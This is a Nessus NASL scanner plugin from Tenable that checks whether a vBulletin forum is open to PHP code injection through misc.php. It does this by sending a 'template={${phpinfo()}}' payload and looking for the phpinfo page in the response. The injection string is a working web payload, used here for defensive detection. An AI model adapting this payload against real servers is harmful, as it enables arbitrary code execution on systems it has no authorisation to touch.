#
# (C) Tenable Network Security
#


if(description)
{
 script_id(17211);
 script_bugtraq_id(12622);
 script_version("$Revision: 1.2 $");
 name["english"] = "vBulletin Misc.PHP PHP Script Code Execution Vulnerability";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running vBulletin, a web based bulletin board system written
in PHP.

The remote version of this software is vulnerable to a script injection issue. 
An attacker may use this flaw to execute arbitrary PHP commands on the remote
host.

Solution : Upgrade to vBulletin 3.0.7 or newer
Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Executes phpinfo() on the remote host";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl", "vbulletin_detect.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

# Check starts here

include("http_func.inc");
include("http_keepalive.inc");



port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if ( ! can_host_php(port:port) ) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/vBulletin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];
  req = http_get(item:dir + "/misc.php?do=page&template={${phpinfo()}}", port:port);
  res = http_keepalive_send_recv(port:port, data:req);
  if ( res == NULL ) exit(0);
  if ( "<title>phpinfo()</title>" >< res ) security_hole(port);
}
